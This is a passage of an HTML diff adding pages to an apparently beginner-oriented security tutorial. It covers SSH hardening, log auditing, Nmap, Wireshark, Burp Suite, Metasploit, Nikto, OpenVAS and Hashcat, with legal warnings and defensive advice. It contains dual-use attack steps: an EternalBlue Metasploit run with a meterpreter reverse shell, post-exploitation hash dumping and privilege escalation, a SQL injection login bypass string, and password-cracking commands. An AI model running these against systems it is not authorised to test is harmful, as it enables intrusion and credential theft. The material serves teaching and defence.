+<span class="fl">ls</span> <span class="fl">-la</span> /etc/passwd<br>
+<span class="cm"># rwxr-xr-x = owner/group/others</span><br><br>
+<span class="cm"># Fix bad permissions</span><br>
+<span class="fl">chmod</span> 600 ~/.ssh/id_rsa   <span class="cm"># private key</span><br>
+<span class="fl">chmod</span> 700 ~/.ssh          <span class="cm"># .ssh folder</span>
+      </div>
+    </div>
+    <div class="card">
+      <div class="badge hot">Critical</div>
+      <div class="card-title">SSH Hardening</div>
+      <div class="layman"><span class="layman-label">Layman</span>SSH is the remote door to your server. By default, it's like having a door that accepts anyone who knows a password. Hardening means: change the door number, require a special key card (not just password), and ban root access.</div>
+      <div class="code">
+<span class="cm"># Edit SSH config</span><br>
+<span class="fl">sudo</span> vim /etc/ssh/sshd_config<br><br>
+<span class="cm"># Key settings to change:</span><br>
+<span class="st">Port 2222</span>               <span class="cm"># NOT default 22</span><br>
+<span class="st">PermitRootLogin no</span>      <span class="cm"># disable root SSH</span><br>
+<span class="st">PasswordAuthentication no</span> <span class="cm"># keys only!</span><br>
+<span class="st">MaxAuthTries 3</span>          <span class="cm"># limit attempts</span><br>
+<span class="st">AllowUsers deployuser</span>   <span class="cm"># whitelist users</span><br><br>
+<span class="cm"># Restart SSH after changes</span><br>
+<span class="fl">sudo</span> systemctl restart sshd<br><br>
+<span class="cm"># Generate SSH key pair</span><br>
+<span class="fl">ssh-keygen</span> <span class="fl">-t ed25519</span> <span class="fl">-C</span> <span class="st">"mykey"</span><br>
+<span class="cm"># Copy to server:</span><br>
+<span class="fl">ssh-copy-id</span> user@server
+      </div>
+      <div class="pc">
+        <div class="pros"><div class="pt">Hardened SSH</div><ul><li>Key-based auth — nearly unbreakable</li><li>No brute force possible</li></ul></div>
+        <div class="cons"><div class="ct">Risks</div><ul><li>Lose your key = locked out</li><li>Always keep backup access method</li></ul></div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="badge core">System Monitoring</div>
+      <div class="card-title">Logs & Audit Trails</div>
+      <div class="layman"><span class="layman-label">Layman</span>Logs are your security cameras. Every login, every command run as sudo, every failed attempt — it's recorded. When something bad happens, logs tell you who did what and when.</div>
+      <div class="code">
+<span class="cm"># Key log files to know:</span><br>
+<span class="fl">tail</span> <span class="fl">-f</span> /var/log/auth.log    <span class="cm"># SSH logins</span><br>
+<span class="fl">tail</span> <span class="fl">-f</span> /var/log/syslog      <span class="cm"># system events</span><br>
+<span class="fl">tail</span> <span class="fl">-f</span> /var/log/nginx/access.log<br><br>
+<span class="cm"># Search logs for failed logins:</span><br>
+<span class="fl">grep</span> <span class="st">"Failed password"</span> /var/log/auth.log<br><br>
+<span class="cm"># Find all sudo usage:</span><br>
+<span class="fl">grep</span> <span class="st">"sudo"</span> /var/log/auth.log<br><br>
+<span class="cm"># Install auditd for deep audit</span><br>
+<span class="fl">sudo</span> apt install auditd<br>
+<span class="fl">auditctl</span> <span class="fl">-w</span> /etc/passwd <span class="fl">-p</span> wa   <span class="cm"># watch file</span><br>
+<span class="fl">ausearch</span> <span class="fl">-f</span> /etc/passwd
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 4: NMAP ════════ -->
+<section class="page" id="nmap">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--cyan)">PAGE 04 — RECON TOOL</div>
+    <h2 class="page-title" style="color:var(--cyan)">Nmap — Network Mapper</h2>
+    <p class="page-desc">The most important reconnaissance tool. Tells you what's running on any network. Every DevOps & security engineer uses this daily.</p>
+  </div>
+  <div class="bigcard reveal">
+    <div class="bg">🗺️</div>
+    <div class="badge tool">Free & Open Source</div>
+    <div class="bigcard-title">Nmap: Your Network X-Ray Machine</div>
+    <div class="layman"><span class="layman-label">Layman Explanation</span>Imagine you're a security guard doing a walkthrough of a building. Nmap is your scanner — it goes to every room (port), knocks on the door, and reports back: "Room 80 is open, someone named 'nginx' is inside. Room 22 is open, someone named 'OpenSSH' is there. Room 3306 is locked." You get a complete picture of what's running on any system before you even log in.</div>
+    <div class="pc">
+      <div class="pros"><div class="pt">Pros</div><ul><li>Free, powerful, industry standard</li><li>Works on any OS</li><li>Detects services & versions</li><li>Scriptable with NSE scripts</li><li>Used by both attackers AND defenders</li></ul></div>
+      <div class="cons"><div class="ct">Cons / Warnings</div><ul><li>Scanning networks you don't own = illegal</li><li>Loud scans can trigger IDS/IPS alerts</li><li>Full port scans take time</li><li>Some firewalls block/deceive Nmap</li></ul></div>
+    </div>
+  </div>
+  <div class="grid reveal">
+    <div class="card cyan">
+      <div class="badge core">Basic Scans</div>
+      <div class="card-title">Essential Nmap Commands</div>
+      <div class="code">
+<span class="cm"># Install Nmap</span><br>
+<span class="fl">sudo</span> apt install nmap<br><br>
+<span class="cm"># Basic host scan — is it alive?</span><br>
+<span class="fl">nmap</span> 192.168.1.1<br><br>
+<span class="cm"># Scan top 1000 ports (default)</span><br>
+<span class="fl">nmap</span> 192.168.1.1<br><br>
+<span class="cm"># Scan specific port</span><br>
+<span class="fl">nmap</span> <span class="fl">-p</span> 80 192.168.1.1<br><br>
+<span class="cm"># Scan port range</span><br>
+<span class="fl">nmap</span> <span class="fl">-p</span> 1-1000 192.168.1.1<br><br>
+<span class="cm"># Scan ALL 65535 ports</span><br>
+<span class="fl">nmap</span> <span class="fl">-p-</span> 192.168.1.1<br><br>
+<span class="cm"># Scan entire subnet</span><br>
+<span class="fl">nmap</span> 192.168.1.0/24<br><br>
+<span class="cm"># Skip host discovery (assume alive)</span><br>
+<span class="fl">nmap</span> <span class="fl">-Pn</span> 192.168.1.1
+      </div>
+    </div>
+    <div class="card cyan">
+      <div class="badge adv">Advanced Scans</div>
+      <div class="card-title">Service & OS Detection</div>
+      <div class="code">
+<span class="cm"># Detect service versions (-sV)</span><br>
+<span class="fl">nmap</span> <span class="fl">-sV</span> 192.168.1.1<br>
+<span class="cm"># Result: 22/tcp open ssh OpenSSH 8.2</span><br><br>
+<span class="cm"># Detect OS (-O)</span><br>
+<span class="fl">nmap</span> <span class="fl">-O</span> 192.168.1.1<br>
+<span class="cm"># Needs sudo</span><br><br>
+<span class="cm"># Aggressive scan (-A) = sV+O+scripts+traceroute</span><br>
+<span class="fl">nmap</span> <span class="fl">-A</span> 192.168.1.1<br><br>
+<span class="cm"># SYN scan (stealth, needs sudo)</span><br>
+<span class="fl">sudo nmap</span> <span class="fl">-sS</span> 192.168.1.1<br><br>
+<span class="cm"># UDP scan (slow but important)</span><br>
+<span class="fl">sudo nmap</span> <span class="fl">-sU</span> 192.168.1.1<br><br>
+<span class="cm"># Save output to file</span><br>
+<span class="fl">nmap</span> <span class="fl">-oN</span> output.txt 192.168.1.1<br>
+<span class="fl">nmap</span> <span class="fl">-oX</span> output.xml 192.168.1.1  <span class="cm"># XML</span><br><br>
+<span class="cm"># Run NSE vulnerability scripts</span><br>
+<span class="fl">nmap</span> <span class="fl">--script vuln</span> 192.168.1.1
+      </div>
+    </div>
+    <div class="card cyan">
+      <div class="badge hot">Real World Use</div>
+      <div class="card-title">DevOps Use Cases</div>
+      <div class="layman"><span class="layman-label">Layman</span>Before deploying to production, run Nmap on your own servers to verify: are any unexpected ports open? Did your database accidentally expose itself to the internet?</div>
+      <div class="code">
+<span class="cm"># Audit your own server after deploy:</span><br>
+<span class="fl">nmap</span> <span class="fl">-sV</span> <span class="fl">-p-</span> your-server-ip<br><br>
+<span class="cm"># Quick scan for top 100 ports</span><br>
+<span class="fl">nmap</span> <span class="fl">-F</span> your-server-ip<br><br>
+<span class="cm"># Check if a specific service is exposed</span><br>
+<span class="fl">nmap</span> <span class="fl">-p</span> 3306,5432,6379 your-server-ip<br>
+<span class="cm"># If these show open = DANGER!</span><br><br>
+<span class="cm"># Verify firewall rules work:</span><br>
+<span class="fl">nmap</span> <span class="fl">-Pn</span> <span class="fl">--open</span> your-server-ip<br>
+<span class="cm"># Only shows actually open ports</span>
+      </div>
+      <div class="alert warn">⚠️ Only scan systems you own or have written permission to scan. Unauthorized scanning is illegal.</div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 5: WIRESHARK ════════ -->
+<section class="page" id="wireshark">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--cyan)">PAGE 05 — PACKET ANALYSIS</div>
+    <h2 class="page-title" style="color:var(--cyan)">Wireshark & tcpdump</h2>
+    <p class="page-desc">Packet analyzers — see every single byte traveling across your network in real time. Essential for debugging and detecting attacks.</p>
+  </div>
+  <div class="banner cyan reveal">
+    <div class="banner-icon">🔬</div>
+    <div>
+      <div class="banner-title">Network Microscope</div>
+      <div class="banner-text">Wireshark shows you every packet on your network — like reading every letter in every envelope passing through your mail room. You can see usernames, passwords (on unencrypted connections), and attack patterns live. Critical for detecting intrusions and debugging network issues.</div>
+    </div>
+  </div>
+  <div class="grid reveal">
+    <div class="card cyan">
+      <div class="badge tool">GUI Tool</div>
+      <div class="card-title">Wireshark — Visual Analysis</div>
+      <div class="layman"><span class="layman-label">Layman</span>Wireshark has a visual interface. You click "Start Capture" and watch packets fly by in real time. You can filter for just HTTP traffic, just a specific IP, just passwords — incredibly powerful for learning and investigation.</div>
+      <div class="code">
+<span class="cm"># Install Wireshark</span><br>
+<span class="fl">sudo</span> apt install wireshark<br><br>
+<span class="cm"># Run with sudo (or add to wireshark group)</span><br>
+<span class="fl">sudo</span> wireshark<br><br>
+<span class="cm"># Key Display Filters in Wireshark GUI:</span><br>
+<span class="st">http</span>                  <span class="cm"># show only HTTP</span><br>
+<span class="st">http.request</span>          <span class="cm"># HTTP requests only</span><br>
+<span class="st">ip.addr == 192.168.1.5</span>  <span class="cm"># specific IP</span><br>
+<span class="st">tcp.port == 443</span>       <span class="cm"># HTTPS traffic</span><br>
+<span class="st">dns</span>                   <span class="cm"># DNS queries</span><br>
+<span class="st">ftp</span>                   <span class="cm"># FTP (sends passwords clear!)</span><br>
+<span class="st">tcp contains "password"</span>  <span class="cm"># keyword search</span><br>
+<span class="st">!(arp or dns)</span>         <span class="cm"># exclude noise</span>
+      </div>
+    </div>
+    <div class="card cyan">
+      <div class="badge tool">CLI Tool</div>
+      <div class="card-title">tcpdump — Terminal Packet Capture</div>
+      <div class="layman"><span class="layman-label">Layman</span>tcpdump is Wireshark for the terminal — no GUI needed. Essential on servers where you don't have a desktop. You can capture packets, save them, and analyze later in Wireshark.</div>
+      <div class="code">
+<span class="cm"># Install tcpdump</span><br>
+<span class="fl">sudo</span> apt install tcpdump<br><br>
+<span class="cm"># Capture all traffic on interface</span><br>
+<span class="fl">sudo</span> tcpdump <span class="fl">-i</span> eth0<br><br>
+<span class="cm"># Capture specific port</span><br>
+<span class="fl">sudo</span> tcpdump <span class="fl">-i</span> eth0 <span class="st">port 80</span><br><br>
+<span class="cm"># Capture traffic from specific IP</span><br>
+<span class="fl">sudo</span> tcpdump <span class="fl">-i</span> eth0 <span class="st">host 192.168.1.5</span><br><br>
+<span class="cm"># Save to file (open in Wireshark)</span><br>
+<span class="fl">sudo</span> tcpdump <span class="fl">-i</span> eth0 <span class="fl">-w</span> capture.pcap<br><br>
+<span class="cm"># Read saved file</span><br>
+<span class="fl">sudo</span> tcpdump <span class="fl">-r</span> capture.pcap<br><br>
+<span class="cm"># Show packet contents (verbose)</span><br>
+<span class="fl">sudo</span> tcpdump <span class="fl">-i</span> eth0 <span class="fl">-A</span> port 80<br>
+<span class="cm"># -A prints ASCII content — see passwords!</span>
+      </div>
+    </div>
+  </div>
+  <div class="grid reveal" style="margin-top:1.25rem;">
+    <div class="card cyan">
+      <div class="card-title">Detecting Attacks with Packet Analysis</div>
+      <div class="code">
+<span class="cm"># Detect ARP poisoning (MitM attack)</span><br>
+<span class="fl">sudo</span> tcpdump <span class="fl">-i</span> eth0 arp<br>
+<span class="cm"># Look for: same IP with 2 different MACs</span><br><br>
+<span class="cm"># Detect port scan (many SYN packets)</span><br>
+<span class="fl">sudo</span> tcpdump <span class="fl">-i</span> eth0 'tcp[tcpflags] == tcp-syn'<br><br>
+<span class="cm"># Detect DNS exfiltration</span><br>
+<span class="fl">sudo</span> tcpdump <span class="fl">-i</span> eth0 <span class="st">port 53</span> <span class="fl">-v</span><br>
+<span class="cm"># Unusually large DNS queries = red flag</span><br><br>
+<span class="cm"># Monitor specific protocol</span><br>
+<span class="fl">sudo</span> tcpdump <span class="fl">-i</span> eth0 <span class="st">icmp</span>  <span class="cm"># ping traffic</span>
+      </div>
+    </div>
+    <div class="card cyan">
+      <div class="badge hot">Security Warning</div>
+      <div class="card-title">Why Encrypt Everything</div>
+      <div class="layman"><span class="layman-label">Layman</span>Anyone on the same network can run Wireshark and read your traffic if it's unencrypted. Hotel WiFi, coffee shop, corporate network — all vulnerable. This is why HTTPS, SSH, and VPN exist.</div>
+      <div class="alert danger">🚨 HTTP sends passwords, cookies, and data in plain text. Anyone on the same network can steal them with Wireshark. ALWAYS use HTTPS.</div>
+      <ul class="cl c" style="margin-top:0.75rem;">
+        <li>Never use HTTP for anything sensitive</li>
+        <li>Use SSH, not Telnet (Telnet is plain text)</li>
+        <li>Use SFTP, not FTP (FTP sends passwords plain)</li>
+        <li>On public WiFi, always use VPN</li>
+        <li>Encrypt your API keys in transit AND at rest</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 6: BURP SUITE ════════ -->
+<section class="page" id="burpsuite">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--red)">PAGE 06 — WEB HACKING</div>
+    <h2 class="page-title" style="color:var(--red)">Burp Suite</h2>
+    <p class="page-desc">The #1 web application security testing tool. Every web security professional uses this.</p>
+  </div>
+  <div class="bigcard reveal">
+    <div class="bg">🕷️</div>
+    <div class="badge hot">Industry Standard</div>
+    <div class="bigcard-title">Burp Suite: Web Traffic Interceptor</div>
+    <div class="layman"><span class="layman-label">Layman Explanation</span>When you use a website, your browser sends requests and gets responses. Burp Suite sits in the middle — like a translator who reads and can modify every message. You can intercept a login form, change your username from "alice" to "admin", and see what happens. You can replay requests, change parameters, test for SQL injection — all through a clean interface.</div>
+    <div class="grid-2" style="margin-top:1.5rem;">
+      <div>
+        <div style="font-family:'Orbitron',monospace;font-size:0.75rem;color:var(--red);margin-bottom:0.75rem;">KEY MODULES</div>
+        <ul class="cl r">
+          <li><strong>Proxy</strong> — Intercept & modify HTTP requests in real time</li>
+          <li><strong>Repeater</strong> — Replay and modify saved requests manually</li>
+          <li><strong>Intruder</strong> — Automated attack tool (fuzzing, brute force)</li>
+          <li><strong>Scanner</strong> — Auto-scan for vulnerabilities (Pro version)</li>
+          <li><strong>Decoder</strong> — Encode/decode Base64, URL, HTML, etc.</li>
+          <li><strong>Comparer</strong> — Diff two responses to spot differences</li>
+        </ul>
+      </div>
+      <div class="pc" style="display:block;">
+        <div class="pros" style="margin-bottom:0.75rem;"><div class="pt">Pros</div><ul><li>Best-in-class web testing</li><li>Free community edition available</li><li>Industry standard — every job asks for it</li><li>Powerful proxy & fuzzing</li></ul></div>
+        <div class="cons"><div class="ct">Cons</div><ul><li>Pro version is expensive ($449/year)</li><li>Steep learning curve</li><li>Community version has limits</li></ul></div>
+      </div>
+    </div>
+  </div>
+  <div class="grid reveal">
+    <div class="card red">
+      <div class="badge tool">Setup</div>
+      <div class="card-title">Burp Suite Setup</div>
+      <div class="steps">
+        <div class="step"><div class="step-dot r">1</div><div class="step-body"><div class="st-title">Download & Launch</div><div class="st-desc">Get Community Edition free from portswigger.net. Run Java JAR or installer. Start "Temporary Project".</div></div></div>
+        <div class="step"><div class="step-dot r">2</div><div class="step-body"><div class="st-title">Configure Browser Proxy</div><div class="st-desc">Set browser proxy to 127.0.0.1:8080. Or use Burp's built-in Chromium browser (easiest).</div></div></div>
+        <div class="step"><div class="step-dot r">3</div><div class="step-body"><div class="st-title">Install CA Certificate</div><div class="st-desc">Visit http://burp, download cert, install in browser. This lets Burp intercept HTTPS.</div></div></div>
+        <div class="step"><div class="step-dot r">4</div><div class="step-body"><div class="st-title">Enable Intercept</div><div class="st-desc">Proxy → Intercept → Intercept is ON. Now every request pauses for you to inspect.</div></div></div>
+      </div>
+    </div>
+    <div class="card red">
+      <div class="badge hot">Common Tests</div>
+      <div class="card-title">What DevOps Engineers Test</div>
+      <div class="layman"><span class="layman-label">Layman</span>As a DevOps engineer, you use Burp to verify your web app is secure before deploying — like a pre-flight checklist. Test that authentication works, cookies are secure, and inputs are validated.</div>
+      <ul class="cl r">
+        <li><strong>Test login forms</strong> — Can I bypass with SQL injection? Try: <code style="color:var(--yellow)">' OR 1=1--</code></li>
+        <li><strong>Cookie inspection</strong> — Are session cookies marked HttpOnly & Secure?</li>
+        <li><strong>IDOR testing</strong> — Change user ID in URL from 1 to 2 — can I see other users?</li>
+        <li><strong>Header testing</strong> — Is X-Frame-Options set? Content-Security-Policy?</li>
+        <li><strong>Auth bypass</strong> — Can I access /admin without logging in?</li>
+        <li><strong>File upload</strong> — Can I upload a PHP shell instead of an image?</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 7: METASPLOIT ════════ -->
+<section class="page" id="metasploit">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--red)">PAGE 07 — EXPLOITATION</div>
+    <h2 class="page-title" style="color:var(--red)">Metasploit Framework</h2>
+    <p class="page-desc">The world's most used penetration testing framework. Thousands of pre-built exploits for known vulnerabilities.</p>
+  </div>
+  <div class="banner red reveal">
+    <div class="banner-icon">💣</div>
+    <div>
+      <div class="banner-title">⚠️ Legal Warning — Only on Systems You Own or Have Permission</div>
+      <div class="banner-text">Metasploit is a powerful exploitation framework. Using it against systems without authorization is a criminal offense. Use it on your own test lab, virtual machines (HackTheBox, TryHackMe, DVWA), or with explicit written permission from the system owner.</div>
+    </div>
+  </div>
+  <div class="grid reveal">
+    <div class="card red">
+      <div class="badge hot">Framework</div>
+      <div class="card-title">Metasploit Basics</div>
+      <div class="layman"><span class="layman-label">Layman</span>Metasploit is like a toolbox of lockpicks for every known lock. Someone found a vulnerability in Windows XP? There's a Metasploit module for it. You just pick the exploit, set the target IP, and fire. The framework handles all the technical complexity of the actual exploit.</div>
+      <div class="code">
+<span class="cm"># Install on Kali/Parrot Linux (pre-installed)</span><br>
+<span class="fl">sudo</span> apt install metasploit-framework<br><br>
+<span class="cm"># Start Metasploit console</span><br>
+<span class="fl">msfconsole</span><br><br>
+<span class="cm"># Basic workflow:</span><br>
+<span class="st">msf6&gt;</span> search eternalblue         <span class="cm"># find exploit</span><br>
+<span class="st">msf6&gt;</span> use exploit/windows/smb/ms17_010_eternalblue<br>
+<span class="st">msf6&gt;</span> show options               <span class="cm"># see required fields</span><br>
+<span class="st">msf6&gt;</span> set RHOSTS 192.168.1.10    <span class="cm"># target IP</span><br>
+<span class="st">msf6&gt;</span> set LHOST 192.168.1.5      <span class="cm"># your IP</span><br>
+<span class="st">msf6&gt;</span> set payload windows/x64/meterpreter/reverse_tcp<br>
+<span class="st">msf6&gt;</span> run                        <span class="cm"># launch exploit</span>
+      </div>
+    </div>
+    <div class="card red">
+      <div class="badge adv">Post-Exploitation</div>
+      <div class="card-title">Meterpreter Shell</div>
+      <div class="layman"><span class="layman-label">Layman</span>If the exploit works, you get a Meterpreter shell — like having a remote control for the target computer. You can run commands, upload/download files, escalate to admin. Defenders need to know what attackers do post-exploitation to properly defend.</div>
+      <div class="code">
+<span class="cm"># Once you have a Meterpreter session:</span><br>
+<span class="st">meterpreter&gt;</span> sysinfo         <span class="cm"># system info</span><br>
+<span class="st">meterpreter&gt;</span> getuid           <span class="cm"># current user</span><br>
+<span class="st">meterpreter&gt;</span> getsystem        <span class="cm"># escalate to SYSTEM</span><br>
+<span class="st">meterpreter&gt;</span> hashdump         <span class="cm"># dump password hashes</span><br>
+<span class="st">meterpreter&gt;</span> shell            <span class="cm"># get cmd shell</span><br>
+<span class="st">meterpreter&gt;</span> screenshot       <span class="cm"># take screenshot</span><br>
+<span class="st">meterpreter&gt;</span> upload file.txt  <span class="cm"># upload file</span><br>
+<span class="st">meterpreter&gt;</span> download /etc/passwd<br>
+<span class="st">meterpreter&gt;</span> run post/linux/gather/enum_system
+      </div>
+      <div class="alert danger">🔴 This is why patching is critical. EternalBlue exploited an unpatched Windows SMB. Patch. Everything. Always.</div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 8: NIKTO ════════ -->
+<section class="page" id="nikto">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--red)">PAGE 08 — WEB SCANNER</div>
+    <h2 class="page-title" style="color:var(--red)">Nikto — Web Vulnerability Scanner</h2>
+    <p class="page-desc">A free, fast web server scanner that checks for thousands of dangerous files, misconfigurations, and vulnerabilities.</p>
+  </div>
+  <div class="grid reveal">
+    <div class="card red">
+      <div class="badge free">Free Tool</div>
+      <div class="card-title">What Nikto Does</div>
+      <div class="layman"><span class="layman-label">Layman</span>Nikto is an automated web inspector. It visits your website and checks thousands of known dangerous locations — like checking if your admin panel is accidentally public, if you have default passwords, or if old vulnerable software versions are running. Think of it as an automated security audit for websites.</div>
+      <div class="code">
+<span class="cm"># Install Nikto</span><br>
+<span class="fl">sudo</span> apt install nikto<br><br>
+<span class="cm"># Basic scan</span><br>
+<span class="fl">nikto</span> <span class="fl">-h</span> http://target.com<br><br>
+<span class="cm"># Scan specific port</span><br>
+<span class="fl">nikto</span> <span class="fl">-h</span> http://target.com <span class="fl">-p</span> 8080<br><br>
+<span class="cm"># Scan HTTPS</span><br>
+<span class="fl">nikto</span> <span class="fl">-h</span> https://target.com <span class="fl">-ssl</span><br><br>
+<span class="cm"># Save output to HTML</span><br>
+<span class="fl">nikto</span> <span class="fl">-h</span> target.com <span class="fl">-o</span> report.html <span class="fl">-Format</span> htm<br><br>
+<span class="cm"># Tune scan (1=interesting, 2=misconfig, 4=injection...)</span><br>
+<span class="fl">nikto</span> <span class="fl">-h</span> target.com <span class="fl">-Tuning</span> 1234
+      </div>
+      <div class="pc">
+        <div class="pros"><div class="pt">Pros</div><ul><li>Free & fast</li><li>6700+ checks included</li><li>Good for quick audits</li></ul></div>
+        <div class="cons"><div class="ct">Cons</div><ul><li>Very noisy — easily detected</li><li>Many false positives</li><li>Not stealthy at all</li></ul></div>
+      </div>
+    </div>
+    <div class="card red">
+      <div class="badge hot">Common Findings</div>
+      <div class="card-title">What Nikto Finds</div>
+      <ul class="cl r">
+        <li>Default/exposed admin panels (<code style="color:var(--yellow)">/admin, /wp-admin, /phpmyadmin</code>)</li>
+        <li>Server version disclosure in headers (X-Powered-By: PHP/5.6)</li>
+        <li>Missing security headers (X-Frame-Options, CSP, HSTS)</li>
+        <li>Outdated software versions with known CVEs</li>
+        <li>Test files left on server (<code style="color:var(--yellow)">/test.php, /backup.zip</code>)</li>
+        <li>Directory listing enabled (can browse all files)</li>
+        <li>Default credentials on admin areas</li>
+        <li>Dangerous HTTP methods (DELETE, PUT, TRACE) enabled</li>
+      </ul>
+      <div class="alert info">💡 Run Nikto on your own web apps before deploying. Fix what it finds. This is basic DevSecOps hygiene.</div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 9: OPENVAS ════════ -->
+<section class="page" id="openvas">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--yellow)">PAGE 09 — VULNERABILITY MANAGEMENT</div>
+    <h2 class="page-title" style="color:var(--yellow)">OpenVAS / Greenbone</h2>
+    <p class="page-desc">Full-featured open-source vulnerability scanner. Enterprise-grade, free. The open-source alternative to Nessus.</p>
+  </div>
+  <div class="bigcard reveal">
+    <div class="bg">🛡️</div>
+    <div class="badge core">Free Enterprise Tool</div>
+    <div class="bigcard-title">OpenVAS: Your Vulnerability Management Platform</div>
+    <div class="layman"><span class="layman-label">Layman Explanation</span>OpenVAS is like having a full medical team examine your server for every known disease. Nmap tells you which doors are open. Nikto checks the web. OpenVAS scans EVERYTHING — the operating system, services, applications — and produces a detailed report with risk scores, CVE references, and remediation advice for every vulnerability found. It's the most comprehensive free security scanner available.</div>
+    <div class="grid-2" style="margin-top:1.5rem;">
+      <div class="code">
+<span class="cm"># Install OpenVAS (on Kali)</span><br>
+<span class="fl">sudo</span> apt install openvas<br>
+<span class="fl">sudo</span> gvm-setup      <span class="cm"># initial setup (takes time)</span><br>
+<span class="fl">sudo</span> gvm-check-setup <span class="cm"># verify setup</span><br>
+<span class="fl">sudo</span> gvm-start      <span class="cm"># start services</span><br><br>
+<span class="cm"># Access web interface:</span><br>
+<span class="cm"># https://localhost:9392</span><br>
+<span class="cm"># Default: admin / (auto-generated pass)</span><br><br>
+<span class="cm"># Update vulnerability definitions:</span><br>
+<span class="fl">sudo</span> greenbone-nvt-sync<br>
+<span class="fl">sudo</span> greenbone-certdata-sync<br>
+<span class="fl">sudo</span> greenbone-scapdata-sync
+      </div>
+      <div>
+        <div class="pc" style="display:block;">
+          <div class="pros" style="margin-bottom:0.75rem;"><div class="pt">Pros</div><ul><li>Free & open source</li><li>50,000+ vulnerability tests</li><li>Beautiful web interface</li><li>Detailed remediation advice</li><li>Compliance reporting (PCI-DSS, etc.)</li></ul></div>
+          <div class="cons"><div class="ct">Cons</div><ul><li>Complex initial setup</li><li>Scans are very slow (hours)</li><li>High resource usage</li><li>Commercial Nessus has more features</li></ul></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 10: HASHCAT ════════ -->
+<section class="page" id="hashcat">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--red)">PAGE 10 — PASSWORD CRACKING</div>
+    <h2 class="page-title" style="color:var(--red)">Hashcat — Password Cracking</h2>
+    <p class="page-desc">The world's fastest password recovery tool. GPU-accelerated. Essential for testing password policy strength.</p>
+  </div>
+  <div class="banner yellow reveal">
+    <div class="banner-icon">🔑</div>
+    <div>
+      <div class="banner-title">Why DevOps Engineers Need to Know This</div>
+      <div class="banner-text">When a database breach happens and password hashes are leaked, attackers run Hashcat to recover the actual passwords. You need to know how fast/easy your hash algorithm can be cracked — so you choose the right algorithm (bcrypt, not MD5!) and enforce strong password policies.</div>
+    </div>
+  </div>
+  <div class="grid reveal">
+    <div class="card red">
+      <div class="badge hot">Critical</div>
+      <div class="card-title">Understanding Password Hashing</div>
+      <div class="layman"><span class="layman-label">Layman</span>Passwords should never be stored as plain text. Instead, they're run through a hash function that produces a jumbled output. "password123" → "482c811da5d5b4bc6d497ffa98491e38". The trick: given a hash, you can't reverse it — but you can try millions of guesses and see if any match.</div>
+      <table class="tbl">
+        <thead><tr><th>Algorithm</th><th>Speed (GPU)</th><th>Security</th></tr></thead>
+        <tbody>
+          <tr><td>MD5</td><td class="red">64 billion/sec</td><td class="red">BROKEN — never use</td></tr>
+          <tr><td>SHA-1</td><td class="red">20 billion/sec</td><td class="red">Deprecated — avoid</td></tr>
+          <tr><td>SHA-256</td><td class="red">10 billion/sec</td><td>OK for files, not passwords</td></tr>
+          <tr><td>bcrypt</td><td style="color:var(--green);">184/sec</td><td style="color:var(--green);">EXCELLENT — use this</td></tr>
+          <tr><td>Argon2</td><td style="color:var(--green);">100/sec</td><td style="color:var(--green);">BEST — modern choice</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="card red">
+      <div class="badge tool">Commands</div>
+      <div class="card-title">Hashcat Usage</div>
+      <div class="code">
+<span class="cm"># Install hashcat</span><br>
+<span class="fl">sudo</span> apt install hashcat<br><br>
+<span class="cm"># Identify hash type first</span><br>
+<span class="fl">hashid</span> <span class="st">'482c811da5d5b4bc6d497ffa98491e38'</span><br>
+<span class="cm"># or use hash-identifier tool</span><br><br>
+<span class="cm"># Dictionary attack (most common)</span><br>
+<span class="cm"># -m 0 = MD5, -a 0 = dictionary attack</span><br>
+<span class="fl">hashcat</span> <span class="fl">-m 0</span> <span class="fl">-a 0</span> hashes.txt rockyou.txt<br><br>
+<span class="cm"># Brute force (all combinations)</span><br>
+<span class="fl">hashcat</span> <span class="fl">-m 0</span> <span class="fl">-a 3</span> hash.txt <span class="st">'?a?a?a?a?a?a'</span><br>
+<span class="cm"># ?a = any char, 6 characters long</span><br><br>
+<span class="cm"># Common hash type codes:</span><br>
+<span class="cm"># -m 0 = MD5, -m 100 = SHA-1</span><br>
+<span class="cm"># -m 1800 = sha512crypt (Linux /etc/shadow)</span><br>
+<span class="cm"># -m 3200 = bcrypt</span>
+      </div>
+    </div>
+    <div class="card red">
+      <div class="badge core">Defense</div>
+      <div class="card-title">How to Defend Against Password Cracking</div>
+      <ul class="cl r">
+        <li>Always use <strong>bcrypt or Argon2</strong> — never MD5/SHA-1 for passwords</li>
+        <li>Add <strong>salt</strong> — unique random string per password prevents rainbow tables</li>
+        <li>Enforce <strong>minimum 12 characters</strong> — longer = exponentially harder to crack</li>
+        <li>Require <strong>complexity</strong> — mix upper, lower, numbers, symbols</li>
+        <li>Implement <strong>account lockout</strong> after N failed attempts</li>
+        <li>Use <strong>MFA</strong> — even cracked password is useless without the second factor</li>
+        <li>Check passwords against <strong>HaveIBeenPwned</strong> database on registration</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 11: JOHN THE RIPPER ════════ -->
+<section class="page" id="john">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--red)">PAGE 11 — PASSWORD CRACKING</div>
+    <h2 class="page-title" style="color:var(--red)">John the Ripper</h2>
+    <p class="page-desc">Classic password cracker. Excellent for Linux /etc/shadow files and various hash formats. Simpler than Hashcat for quick tasks.</p>
+  </div>
+  <div class="grid reveal">
+    <div class="card red">
+      <div class="badge tool">Classic Tool</div>
